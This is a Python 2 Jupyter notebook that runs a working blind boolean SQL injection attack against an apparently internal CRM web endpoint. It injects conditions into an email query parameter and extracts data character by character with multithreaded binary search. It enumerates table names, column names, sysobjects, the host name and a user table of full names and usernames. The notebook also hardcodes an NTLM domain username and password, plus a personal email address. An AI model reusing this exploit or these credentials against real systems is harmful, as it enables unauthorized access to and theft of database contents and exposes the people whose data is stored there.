{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from requests_ntlm import HttpNtlmAuth\n",
    "import json\n",
    "from concurrent.futures import ThreadPoolExecutor\n",
    "from tqdm import tqdm_notebook"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You have to just define:\n",
    "1. Url with %s where to inject strings ' and 1=1 ' and ' and 1=0 ' and they work\n",
    "2. response true_or false in get_bool\n",
    "3. Multithreading options"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "auth=HttpNtlmAuth('T2RU\\\\Test.crm_sa1','#57dlkNERRW')\n",
    "url = \"http://crmns:10752//handling/getinteractions?beginDate=2019-07-08T00:00:00Z&branchId&clientViewType=2&email=adinadinov@gmail.com'%s)--&endDate=2019-07-15T23:59:59Z&msisdn=\"\n",
    "multithreaded = True\n",
    "threads = 16\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_bool(sql):\n",
    "    while True:\n",
    "        r_url = url % (' and '+ sql + ' ')\n",
    "        r = requests.get(r_url,auth=auth)\n",
    "        if r.status_code != 200:\n",
    "            #rerun\n",
    "            continue\n",
    "        try:\n",
    "            js = json.loads(r.text)\n",
    "        except:\n",
    "            #rerun\n",
    "            continue\n",
    "        if js['IsSuccess']!=True:\n",
    "            #что то совсем не так пошло\n",
    "            raise Exception('ошибка sql: %s'%sql)\n",
    "        if js['Data']['HasWarning']:\n",
    "            return False\n",
    "        else:\n",
    "            return True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#for check\n",
    "print get_bool('1=1')\n",
    "print get_bool('1=0')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "base_from_clause = 'FROM (SELECT *, ROW_NUMBER() OVER(ORDER by [%s])n FROM %s %s)T WHERE n=%d'\n",
    "string_definition = 'SELECT %s'\n",
    "string_len_definition = 'SELECT len(%s)'\n",
    "string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'\n",
    "count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def define_string(table_name,column_name,index):\n",
    "    return string_definition%(column_name) + ' ' + get_from_clause(table_name,column_name,index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_from_clause(table_name,column_name,index,where=None):\n",
    "    to_where = ''\n",
    "    if where != None:\n",
    "        to_where = 'WHERE '+where\n",
    "    return base_from_clause %(column_name,table_name,to_where,index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def define_string_len(table_name,column_name,index,where=None):\n",
    "    return string_len_definition%(column_name)+ ' ' + get_from_clause(table_name,column_name,index,where)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def define_string_char(table_name,column_name,index,string_pos,where=None):\n",
    "    return string_char_definition%(column_name,string_pos) + ' ' + get_from_clause(table_name,column_name,index,where)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def define_count(table_name,where=None):\n",
    "    to_where = ''\n",
    "    if where != None:\n",
    "        to_where = 'WHERE '+where\n",
    "    return count_definition%(table_name,to_where)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def binary_search(s,start_val,start_val_defined=False):\n",
    "    #define real_start_val:\n",
    "    if not start_val_defined:\n",
    "        while True:\n",
    "            sql = '(%s)>%d' %(s,start_val)\n",
    "            #print sql\n",
    "            r = get_bool(sql)\n",
    "            if r:\n",
    "                start_val*=2\n",
    "            else:\n",
    "                break\n",
    "    #now start_val > len\n",
    "    cur_val = start_val/2\n",
    "    move = start_val/4\n",
    "    while True:\n",
    "        sql = '(%s)>%d' %(s,cur_val)\n",
    "        #print sql\n",
    "        r = get_bool(sql)\n",
    "        #print r\n",
    "        if move<1:\n",
    "            if r:\n",
    "                return cur_val+1\n",
    "            else:\n",
    "                return cur_val\n",
    "        if r: #(cur_val+1 - cur_val+2*move)\n",
    "            cur_val+=move\n",
    "        else:\n",
    "            cur_val-=move\n",
    "        move = move/2\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_count(table_name,where=None):\n",
    "    s = define_count(table_name,where)\n",
    "    return binary_search(s,32,False)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_length_of_string(table_name,column_name,index,where=None):  \n",
    "    s = define_string_len(table_name,column_name,index,where)\n",
    "    return binary_search(s,32,False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_char(table_name,column_name,index,str_pos,where=None):\n",
    "    s = define_string_char(table_name,column_name,index,str_pos,where)\n",
    "    return chr(binary_search(s,256,True))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_char_for_pool(chunk):\n",
    "    return get_char(*chunk)\n",
    "\n",
    "def get_string(table_name,column_name,index,where=None):\n",
    "    l = get_length_of_string(table_name,column_name,index,where)\n",
    "    r = ''\n",
    "    if not multithreaded:\n",
    "        for i in range(l):\n",
    "            r+=get_char(table_name,column_name,index,i+1,where)\n",
    "            #print r\n",
    "        return r\n",
    "    else:\n",
    "        with ThreadPoolExecutor(max_workers=threads) as pool:\n",
    "            r = ''.join(list(pool.map(get_char_for_pool,[(table_name,column_name,index,i+1,where) for i in range(l)])))\n",
    "            return r\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%time\n",
    "threads=16\n",
    "multithreaded=True\n",
    "print get_string('information_schema.tables','table_name',1,'table_name=\\'t2_ClientCategory\\'')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get(columns,table_name,where=None):\n",
    "    count = get_count(table_name,where)\n",
    "    print 'count %d' % count\n",
    "    res = []\n",
    "    for i in tqdm_notebook(range(count)):\n",
    "        cs = []\n",
    "        for column in columns:\n",
    "            cs.append(get_string(table_name,column,i+1,where))\n",
    "        res.append(cs)\n",
    "    return res"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "get(['table_name'],'information_schema.tables')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "columns = {}\n",
    "for t in tables:\n",
    "    t = t[0]\n",
    "    r = get(['column_name'],'information_schema.columns',\"table_name='%s'\"%t)\n",
    "    columns[t]=r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "userTab = get(['FIO','UserName'],'temp_UserTab')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "get_count('sysobjects')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "get_bool(\"host_name() like '%t2ru-crmccbe-01%'\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_tables = get(['name'],'sysobjects')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print get_string('temp_UserTab','UserName',1).decode('cp1251')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.16"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
